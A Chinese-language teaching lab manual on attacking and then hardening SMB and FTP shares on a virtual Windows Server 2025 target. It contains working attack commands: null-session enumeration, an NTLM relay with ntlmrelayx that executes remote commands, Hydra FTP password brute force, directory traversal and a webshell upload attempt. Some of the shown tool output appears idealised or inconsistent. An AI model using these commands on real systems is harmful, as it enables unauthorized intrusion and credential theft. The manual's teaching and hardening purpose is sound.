---
color: "linear-gradient(45deg, #23d4fd 0%, #3a98f0 50%, #b721ff 100%)"
---
# 实验三：SMB与FTP共享服务渗透

> 对应章节：项目三 Windows服务器共享管理
实验目标：掌握 SMB 匿名枚举、SMB Signing 与 NTLM Relay 风险、FTP 明文嗅探风险、共享权限边界验证与加固方法
预计用时：120分钟
难度等级：⭐⭐⭐（中级）
> 

---

# 第一部分：前置知识点

## 1. SMB协议深度解析

### 1.1 SMB协议工作原理

SMB（Server Message Block）是Windows文件共享的核心协议，通过**客户端-服务器**模型提供网络文件访问：

```
客户端（访问共享）              SMB协议（TCP 445）            服务器（提供共享）
┌───────────┐                                           ┌───────────┐
│ net use    │ ─── Negotiate（协商协议版本）──────────►    │           │
│ \\IP\share│ ◄── Negotiate Response（确定版本）────      │  SMB服务   │
│           │                                           │           │
│           │ ─── Session Setup（认证）──────────────►    │  srv2.sys│
│           │ ◄── Session Setup Response ─────────────  │  (内核驱动)│
│           │                                           │           │
│           │ ─── Tree Connect（连接共享名）────────►     │           │
│           │ ◄── Tree Connect Response ─────────────   │           │
│           │                                           │           │
│           │ ─── Open/Read/Write/Create（文件操作）──    │           │
└───────────┘                                           └───────────┘
```

### 1.2 SMB版本安全演进

```
SMBv1（已废弃）         SMBv2/2.1               SMBv3/3.1.1
────────────           ─────────              ───────────
Windows XP/2003         Windows 7/2008R2       Windows 10/2016+

❌ 协议层面存在漏洞      ✓ 减少协议往返           ✓ 端对端加密
❌ MS17-010永恒之蓝     ✓ 支持大MTU              ✓ 持续可用性
❌ 无加密支持            ✓ 管道化通信              ✓ 预认证完整性
❌ 无完整性校验          ✓ 签名支持                ✓ SMB over QUIC

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
⚠️ 关键教训：协议版本升级 ≠ 安全风险消除！
   SMBv3的压缩功能(CVE-2020-0796)同样可被利用
   → 根本防御 = 定期打补丁 + 禁用旧版本协议
```

### 1.3 SMB空会话（Null Session）

```
什么是空会话？
- 使用空的用户名和密码（Anonymous）建立SMB连接
- 可访问IPC$（进程间通信共享）
- 历史上用于网络浏览和枚举（兼容性设计）

空会话可以枚举什么？
┌─────────────────────────────────────────────┐
│ IPC$ 空会话 → 枚举能力                       │
├─────────────────────────────────────────────┤
│ ✓ 用户名列表（SAM枚举）                    │
│ ✓ 组列表                                    │
│ ✓ 共享资源列表                              │
│ ✓ 域用户/域信任信息（域环境）               │
│ ✗ 无法读取文件内容                         │
│ ✗ 无法执行命令                             │
└─────────────────────────────────────────────┘

防御：RestrictAnonymous = 2 + RestrictAnonymousSAM = 1
```

### 1.4 MS17-010（永恒之蓝）漏洞原理

```
漏洞本质：SMBv1协议中Trans2子命令处理函数的整数溢出

攻击流程（无需认证！）：
┌──────────┐                              ┌──────────┐
│ 攻击者    │  特制SMB数据包               │ 靶机      │
│           │  （触发堆溢出）               │  Win2008  │
│           │ ──────────────────────────►  │  R2       │
│           │                              │           │
│           │    覆盖返回地址               │  srv.sys  │
│           │    ◄──── shellcode ────────► │  内核态   │
│           │                              │           │
│           │    获取SYSTEM权限            │  权限执行 │
│           │ ◄──── Meterpreter ────────── │  shellcode│
└──────────┘                              └──────────┘

关键点：
- SMBv1才存在此漏洞 → 禁用SMBv1即可根本防御
- 无需任何认证 → 任何人都可以利用
- 内核态执行 → 获取SYSTEM最高权限
- 蠕虫式传播 → WannaCry/NotPetya使用的就是此漏洞
```

---

## 2. FTP协议安全分析

### 2.1 FTP双通道机制

```
主动模式（PORT）：
客户端:5000 ──21端口(控制)──► 服务器
客户端:5001 ◄──20端口(数据)──── 服务器（服务器主动连客户端）
                 ⚠️ 防火墙/NAT环境下失败

被动模式（PASV）：
客户端:5000 ──21端口(控制)──► 服务器
客户端:5001 ──随机高端口────► 服务器（客户端主动连服务器）
                 ✅ 防火墙/NAT环境友好

控制通道（21端口）：传输命令和响应
数据通道：传输文件内容
```

### 2.2 FTP安全致命弱点

```
┌──────────────────────────────────────────────────────┐
│ FTP 的三大安全缺陷                                    │
├──────────────────────────────────────────────────────┤
│ 1. 明文传输                                         │
│    用户名、密码、文件内容全部明文                     │
│    → 可被Wireshark/tcpdump直接嗅探                   │
│                                                      │
│ 2. 无加密                                           │
│    不支持TLS/SSL（FTPS是扩展，非常规配置）           │
│    → 中间人攻击可篡改传输内容                        │
│                                                      │
│ 3. 端口分离                                         │
│    控制端口和数据端口分离，防火墙配置复杂             │
│    → 被动模式需开放大量高端口                        │
└──────────────────────────────────────────────────────┘

替代方案：
- SFTP（SSH File Transfer Protocol）：端口22，SSH加密通道
- FTPS（FTP over TLS）：端口21，增加TLS加密层
- SCP（Secure Copy）：基于SSH，加密传输
```

---

## 3. 共享权限与NTFS权限计算规则

### 3.1 双层权限模型

```
用户通过网络访问共享文件夹时：
                    ┌─────────────────┐
                    │  共享权限        │ ← 网络访问入口
                    │  (Share Perm)   │
                    └────────┬────────┘
                             │ 取交集
                    ┌────────▼────────┐
                    │  NTFS权限       │ ← 文件系统控制
                    │  (NTFS Perm)   │
                    └────────┬────────┘
                             │
              最终有效权限 = min(共享权限, NTFS权限)
              ┌─────────────────────────────────────────┐
              │  例：共享权限=完全控制 + NTFS=读取     │
              │      最终 = 读取（取更严格的）         │
              │                                         │
              │  例：共享权限=读取 + NTFS=修改          │
              │      最终 = 读取（取更严格的）         │
              └─────────────────────────────────────────┘

⚠️ 拒绝（Deny）权限 > 允许（Allow）权限，无论在共享层还是NTFS层
```

> **实验关键提示**：本实验覆盖 SMB 和 FTP 两个攻击面。SMB 部分的核心是理解空会话枚举和 SMB 中继攻击（NTLM Relay）的危害；FTP 部分的核心是理解明文传输的安全风险。实验完成后需通过启用 SMB 签名、禁用 SMBv1、关闭匿名枚举等措施进行加固验证。
> 

---

# 第二部分：实验操作

## 一、实验环境配置

### 1.1 网络拓扑

```
┌─────────────────────┐              NAT模式               ┌─────────────────────┐
│    Kali Linux       │           192.168.1.0/24             │  Windows Server     │
│   2025.4（攻击机）  │◄──────────────────────────────────►  │    2025（靶机）      │
│  IP: 192.168.1.10   │                                      │  IP: 192.168.1.20   │
└─────────────────────┘                                      └─────────────────────┘
```

> **注意**：本实验中SMB中继攻击需要目标服务器未启用SMB签名（Windows Server 2025工作组模式默认不启用）。所有实验步骤均可在Windows Server 2025上完成。
> 

### 1.2 靶机环境详细配置

**虚拟机设置**：

| 项目 | 配置 | 操作系统 | Windows Server 2025 Standard（桌面体验版） |
| --- | --- | --- | --- |
| 内存 | 4 GB | 硬盘 | 60 GB |
| 网络适配器 | NAT模式 | 快照 | 实验前创建快照（命名：实验三-初始状态） |

**靶机初始化脚本**（管理员CMD执行）：

```
REM ============================================
REM 靶机环境初始化脚本 - 实验三
REM ============================================
```

**安装IIS FTP服务**：

```powershell
# 通过服务器管理器安装IIS和FTP
Install-WindowsFeature Web-Server, Web-FTP-Server, Web-FTP-Service, Web-FTP-Extensibility -IncludeManagementTools

# 配置FTP站点（也可通过IIS管理器图形界面配置）
# 1. 创建FTP站点 CompanyFTP，绑定21端口
# 2. 身份验证：启用"基本"身份验证，禁用匿名
# 3. 允许访问：指定用户 Jerry, Tom
# 4. 权限：读取和写入
```

---

## 二、实验步骤

### 阶段一：SMB匿名访问与枚举

**步骤1：检查SMB共享是否允许匿名访问**

```
使用smbclient尝试匿名访问
smbclient -L //192.168.1.20 -N

# 预期输出（如允许匿名）：
# Sharename       Type      Comment
# ---------       ----      -------
# ADMIN$          Disk      Remote Admin
# C$              Disk      Default share
# CompanyShare    Disk
# IPC$            IPC       Remote IPC

# 使用enum4linux全面枚举
enum4linux -a 192.168.1.20

# 检查是否可以通过空会话枚举用户
rpcclient -U "" 192.168.1.20 -c "enumdomusers"
rpcclient -U "" 192.168.1.20 -c "enumdomgroups"
```

> **知识关联**：对应讲义中”匿名访问控制与枚举防护”——Windows默认允许空会话连接IPC$，可枚举用户和共享。
> 

**步骤2：枚举共享权限和ACL**

```
使用smbcacls查看共享权限
smbcacls //192.168.1.20/CompanyShare -N

# 使用CrackMapExec枚举
crackmapexec smb 192.168.1.20 --shares
crackmapexec smb 192.168.1.20 --users

# 尝试访问各个共享
smbclient //192.168.1.20/CompanyShare -N -c "ls"
smbclient //192.168.1.20/C$ -N -c "ls"
smbclient //192.168.1.20/ADMIN$ -N -c "ls"
```

---

### 阶段二：SMB版本识别与安全检测

**步骤3：识别SMB协议版本**

```
# 使用Nmap识别SMB版本
nmap -p 445 --script smb-protocols 192.168.1.20
# 预期输出：
# PORT     STATE SERVICE
# 445/tcp open  microsoft-ds
# | smb-protocols:
# |   dialects:
# |     2.0.2
# |     2.1
# |     3.0
# |     3.0.2
# |     3.1.1

# 使用CrackMapExec识别版本
crackmapexec smb 192.168.1.20

# 使用smbclient指定协议版本连接
smbclient -L //192.168.1.20 -N -m NT1
# 注意：Kali 2025.4 中 -m NT1 替代已废弃的 -m SMB1
```

> **知识关联**：对应讲义中”SMB版本演进”——SMBv1已被废弃但旧系统仍默认启用，存在MS17-010等严重漏洞。
> 

**步骤4：检测SMB签名状态**

```
# SMB签名是防止NTLM中继攻击的关键防御措施
# 当SMB签名未启用时，攻击者可以将截获的NTLM认证中继到其他服务器

# 使用CrackMapExec检测SMB签名状态
crackmapexec smb 192.168.1.20
# 输出中的 Signatures 字段：
# SMB signing: NOT required  ← 表示签名未强制启用（存在中继风险）

# 使用Nmap脚本检测SMB安全模式
nmap -p 445 --script smb-security-mode 192.168.1.20
# 预期输出：
# PORT     STATE SERVICE
# 445/tcp open  microsoft-ds
# | smb-security-mode:
# |   account_used: guest
# |   authentication_level: 1  ← 0=Anonymous, 1=User
# |   challenge_response: supported
# |   message_signing: disabled (dangerous, but default)
# |   message_signing: REQUIRED (not dangerous)

# 使用CrackMapExec生成可中继目标列表
crackmapexec smb 192.168.1.20 --gen-relay-list
# 输出SMB签名未启用且允许匿名访问的目标

# 知识要点：
# - SMB签名=对每个SMB消息添加数字签名，防止中间人篡改
# - 签名未启用时，NTLM认证可被透明转发到其他服务器（中继攻击）
# - Windows默认：域控要求签名，工作组服务器不要求
# - 防御措施：RequireSecuritySignature = $true
```

> **知识关联**：对应讲义中”SMB安全”——SMB签名（SMB Signing）通过对消息进行数字签名来防止中间人篡改和NTLM中继攻击。
> 

### 阶段三：SMB中继攻击（NTLM Relay）

**步骤5：SMB中继攻击演示**

```
# SMB中继攻击原理：
# 攻击者截获受害者的NTLM认证请求，将其转发（中继）到目标服务器
# 目标服务器因为SMB签名未启用，无法验证请求来源，直接接受认证
# 攻击者无需知道密码，即可获得目标服务器的访问权限

# 终端1：在Kali上启动ntlmrelayx中继工具
# 准备中继目标列表
echo "192.168.1.20" > /tmp/targets.txt

# 启动SMB中继监听（替换Kali的SMB服务）
# -smb2support：支持SMBv2协议
# -exec-method smbexec：中继成功后通过SMB执行命令
sudo python3 /usr/share/doc/python3-impacket/examples/ntlmrelayx.py \
  -tf /tmp/targets.txt -smb2support -exec-method smbexec

# 预期输出（等待连接）：
# [*] Protocol Client SMB loaded..
# [*] Protocol Client LDAP loaded..
# [*] Running in relay mode
# [*] SMB server started on 0.0.0.0:445

# 终端2：模拟受害者连接到攻击者的SMB服务
# 实际攻击中，受害者可能通过以下方式被诱导：
# - 打开恶意文档中的UNC路径（\\attacker\share）
# - 访问攻击者控制的Web页面触发NTLM认证
# - 邮件中的网络驱动器映射

# 使用已获取的凭据连接Kali（模拟NTLM认证触发）
smbclient //192.168.1.10/tmp -U weakadmin%admin123

# 回到终端1，观察ntlmrelayx输出：
# [*] SMBD-3: Received connection from 192.168.1.10
# [*] SMBD-3: Connection from 192.168.1.10 controlled
# [*] Protocol Client SMB loaded..
# [*] Protocol Client LDAP loaded..
# [+] SMB session found for domain: WORKGROUP user: weakadmin
# [+] SMB relay succeeded!
# [*] SMBD-3: Connection from 192.168.1.10 controlled, attacking target 192.168.1.20
# [+] SMB signing is NOT required! Relay attack may succeed

# 中继成功后，ntlmrelayx自动获得目标SMB访问权限
# 可以执行以下操作（通过--exec-method参数指定）：
# -smbexec    通过SMB服务执行命令（创建服务）
# -atexec     通过任务计划执行命令
# -wmiexec    通过WMI远程执行命令

# 通过中继会话执行命令示例：
# 在ntlmrelayx运行时，连接成功后会自动进入交互式Shell
# 或使用 -c 参数直接执行命令：
sudo python3 /usr/share/doc/python3-impacket/examples/ntlmrelayx.py \
  -tf /tmp/targets.txt -smb2support -c "whoami"
# 预期输出：WORKGROUP\weakadmin

sudo python3 /usr/share/doc/python3-impacket/examples/ntlmrelayx.py \
  -tf /tmp/targets.txt -smb2support -c "ipconfig /all"
# 预期输出：目标服务器的完整网络配置信息
```

**步骤6：启用SMB签名防御中继攻击**

```
# 在靶机上启用SMB签名（需要管理员权限）
# 启用SMB服务端签名（服务器发出的消息带签名）
Set-SmbServerConfiguration -RequireSecuritySignature $true -Force

# 启用SMB客户端签名（客户端验证服务器签名）
Set-SmbClientConfiguration -EnableSecuritySignature $true -Force

# 验证签名已启用
Get-SmbServerConfiguration | Select RequireSecuritySignature
# 预期：True

Get-SmbClientConfiguration | Select EnableSecuritySignature
# 预期：True

# 从Kali重新检测SMB签名状态
crackmapexec smb 192.168.1.20
# 输出中的 Signatures 字段：
# SMB signing: REQUIRED (not dangerous)  ← 签名已强制启用

# 再次运行ntlmrelayx中继攻击
sudo python3 /usr/share/doc/python3-impacket/examples/ntlmrelayx.py \
  -tf /tmp/targets.txt -smb2support -c "whoami"
# 触发NTLM认证：
smbclient //192.168.1.10/tmp -U weakadmin%admin123

# 预期：中继失败！
# [-] SMB signing is REQUIRED! Relay attack will NOT succeed
# [*] Relay attempt to 192.168.1.20:445 FAILED

# 加固前后对比总结：
# ┌─────────────────────────────────────────────────────────┐
# │  状态              │  SMB签名    │  中继攻击结果        │
# ├───────────────────┼──────────┼──────────────────────┤
# │  加固前            │  未启用    │  ✅ 中继成功         │
# │  加固后            │  已启用    │  ❌ 中继失败         │
# └─────────────────────────────────────────────────────────┘

# 补充加固：同时禁用SMBv1（已在步骤3中完成）
# 组合防御 = 启用SMB签名 + 禁用SMBv1 + 关闭匿名枚举
```

> **知识关联**：对应讲义中”SMB安全”——NTLM中继攻击利用SMB签名未启用的弱点，将截获的认证请求转发到目标服务器。启用SMB签名是最有效的防御手段，微软推荐所有Windows服务器启用此功能。
> 

---

### 阶段四：FTP服务渗透

**步骤7：FTP匿名登录测试**

```
# 检测FTP是否允许匿名登录
nmap -p 21 --script ftp-anon 192.168.1.20

# 尝试匿名登录
ftp 192.168.1.20
# 用户名：anonymous
# 密码：（空）

# 使用curl测试
curl -v ftp://192.168.1.20/
curl -v ftp://192.168.1.20/ --user anonymous:
```

**步骤8：FTP弱口令暴力破解**

```
# 使用Hydra进行FTP爆破
hydra -l Jerry -P /tmp/passwords.txt ftp://192.168.1.20
hydra -l Tom -P /tmp/passwords.txt ftp://192.168.1.20

# 预期输出：
# [21][ftp] host: 192.168.1.20   login: Jerry   password: P@ssw0rd123
# [21][ftp] host: 192.168.1.20   login: Tom     password: P@ssw0rd123
```

**步骤9：FTP协议明文嗅探**

```
# 在Kali上启动Wireshark监听eth0网卡
wireshark -i eth0

# 然后进行FTP登录操作
ftp 192.168.1.20
# 登录：Jerry / P@ssw0rd123

# 在Wireshark中过滤FTP流量
# 过滤条件：ftp || tcp.port == 21
# 观察到明文传输的用户名和密码！
```

> **知识关联**：对应讲义中”FTP工作原理”——FTP控制通道（21端口）的账号密码为明文传输，可被网络嗅探截获。
> 

**步骤10：文件上传与目录遍历测试**

```
# 使用获取的FTP凭据登录
ftp 192.168.1.20
# 用户名：Jerry
# 密码：P@ssw0rd123

# 测试目录遍历
cd ../../
cd ../../../
cd ../../Windows/System32/

# 测试文件上传
put /tmp/test.txt

# 测试上传WebShell（如果FTP目录与Web目录重合）
put /tmp/shell.php

# 查看当前目录
pwd
ls -la
```

---

### 阶段五：共享权限越权测试

**步骤11：使用获取的凭据测试共享权限边界**

```
# 使用Jerry（部门A - 应只有读取权限）
smbclient //192.168.1.20/CompanyShare -U Jerry%'P@ssw0rd123'
# 尝试读取
smb: \> cd Sales
smb: \Sales\> get secret_sales.txt /tmp/
# 尝试写入（应该被拒绝）
smb: \Sales\> put /tmp/malicious.txt
# 如果成功写入 → 共享权限配置有误（权限过宽）

# 尝试访问Finance目录
smb: \> cd Finance
# 如果能访问 → NTFS权限可能配置不当

# 使用Tom（部门B - 应有更改权限）
smbclient //192.168.1.20/CompanyShare -U Tom%'P@ssw0rd123'
smb: \> cd Finance
smb: \Finance\> get report.xlsx /tmp/
smb: \Finance\> put /tmp/test.txt
# 如果能删除文件 → 权限过宽
```

> **知识关联**：对应讲义中”共享权限与NTFS权限”——最终有效权限=min(共享权限, NTFS权限)，需验证两者是否正确配置。
> 

---

### 阶段六：SMB安全加固验证

**步骤12：禁用SMBv1并关闭匿名枚举**

```powershell
# 禁用SMBv1
Set-SmbServerConfiguration -EnableSMB1Protocol $false -Force
Set-SmbClientConfiguration -EnableSMB1Protocol $false -Force

# 关闭匿名枚举
reg add "HKLM\SYSTEM\CurrentControlSet\Control\Lsa" /v RestrictAnonymous /t REG_DWORD /d 2 /f
reg add "HKLM\SYSTEM\CurrentControlSet\Control\Lsa" /v RestrictAnonymousSAM /t REG_DWORD /d 1 /f

# 禁止存储网络凭据
reg add "HKLM\SYSTEM\CurrentControlSet\Control\Lsa" /v DisableDomainCreds /t REG_DWORD /d 1 /f

# 强制刷新策略
gpupdate /force

# 验证SMBv1已禁用
Get-SmbServerConfiguration | Select EnableSMB1Protocol
# 预期：False
```

**步骤13：验证加固效果**

```
# SMBv1连接应失败（Kali 2025.4 中使用 -m NT1 替代已废弃的 -m SMB1）
smbclient -L //192.168.1.20 -N -m NT1
# 预期：连接失败，提示协议被拒绝

# 匿名枚举应失败
smbclient -L //192.168.1.20 -N
# 预期：NT_STATUS_ACCESS_DENIED

enum4linux -a 192.168.1.20
# 预期：大量枚举结果返回空或被拒绝

# CrackMapExec验证
crackmapexec smb 192.168.1.20 --shares
# 预期：无法获取共享列表
```

---

## 三、实验报告要求

| 序号 | 记录项 | 说明 |
| --- | --- | --- |
| 1 | SMB匿名枚举结果 | 发现的共享、用户、组 |
| 2 | SMB中继攻击演示 | ntlmrelayx中继成功/失败的截图 |
| 3 | FTP嗅探结果 | Wireshark中明文密码的截图 |
| 4 | 共享权限越权测试 | 各账户的实际权限边界 |
| 5 | 加固前后对比 | 启用SMB签名和关闭匿名枚举后的效果 |

### 思考题

1. SMB中继攻击为什么能在不需要密码的情况下获取服务器访问权限？
2. 启用SMB签名后，中继攻击为什么无法成功？
3. FTP明文传输问题有哪些替代方案？
4. 如何确保共享文件夹的权限配置不会出现越权访问？
5. 为什么关闭匿名枚举（RestrictAnonymous=2）是重要的安全措施？

---

## 四、实验清理

```bash
REM 1. 删除测试用户
net user Jerry /delete
net user Tom /delete
net localgroup 部门A /delete
net localgroup 部门B /delete

REM 2. 删除共享
net share CompanyShare /delete

REM 3. 删除测试目录
rmdir /s /q C:\SharedFolder
rmdir /s /q C:\FTPRoot

REM 4. 启用防火墙
netsh advfirewall set allprofiles state on

REM 5. 卸载IIS（可选）
REM servermanagercmd -remove Web-Server
```

> **免责声明**：本实验仅用于授权的安全教学环境。SMB中继攻击涉及网络协议层面的安全测试，请确保在虚拟机环境中操作。
>